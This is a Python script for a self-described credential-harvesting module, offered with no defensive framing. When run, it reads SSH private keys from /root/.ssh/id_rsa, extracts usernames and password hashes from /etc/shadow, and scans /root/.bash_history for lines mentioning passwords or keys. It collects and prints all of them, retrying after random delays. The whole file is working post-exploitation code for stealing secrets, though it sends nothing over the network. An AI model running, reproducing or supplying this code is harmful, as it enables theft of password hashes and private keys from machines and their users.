import os
import time
import random

class CredentialHarvestingModule:
    def __init__(self, max_retries=3):
        self.max_retries = max_retries
        self.event_log = []
        self.credentials = []

    def harvest_credentials(self):
        print("Harvesting credentials...")
        sources = [
            "/root/.ssh/id_rsa",  # SSH private keys (Linux)
            "/etc/shadow",        # Password hashes (Linux)
            "/root/.bash_history" # Commands that might contain credentials
        ]
        retries = 0
        while retries < self.max_retries:
            try:
                for source in sources:
                    if os.path.exists(source):
                        with open(source, "r") as f:
                            data = f.read()
                            if source == "/etc/shadow":
                                for line in data.splitlines():
                                    if ":" in line and not line.startswith("#"):
                                        user, hash = line.split(":", 2)[:2]
                                        if hash and hash != "*":
                                            self.credentials.append((user, hash, "shadow"))
                                            self.event_log.append(f"Found credential: {user} (hash: {hash}) in {source}")
                                            print(f"Found credential: {user} (hash: {hash}) in {source}")
                            elif source.endswith(".bash_history"):
                                for line in data.splitlines():
                                    if "pass" in line.lower() or "key" in line.lower():
                                        self.credentials.append(("history", line, "bash_history"))
                                        self.event_log.append(f"Found potential credential in {source}: {line}")
                                        print(f"Found potential credential in {source}: {line}")
                            else:  # SSH keys
                                self.credentials.append(("ssh_key", data, source))
                                self.event_log.append(f"Found SSH key in {source}")
                                print(f"Found SSH key in {source}")
                break
            except Exception as e:
                retries += 1
                self.event_log.append(f"Error harvesting credentials (attempt {retries}/{self.max_retries}): {e}")
                print(f"Error harvesting credentials (attempt {retries}/{self.max_retries}): {e}")
                if retries < self.max_retries:
                    time.sleep(random.uniform(1, 5))
                else:
                    self.event_log.append("Max retries reached. Failed to harvest credentials.")
                    print("Max retries reached. Failed to harvest credentials.")
        return self.credentials

    def get_event_log(self):
        return self.event_log

if __name__ == "__main__":
    harvester = CredentialHarvestingModule()
    creds = harvester.harvest_credentials()
    print("\nHarvested Credentials:", creds if creds else "None")
    print("\nEvent Log:")
    for entry in harvester.get_event_log():
        print(entry)
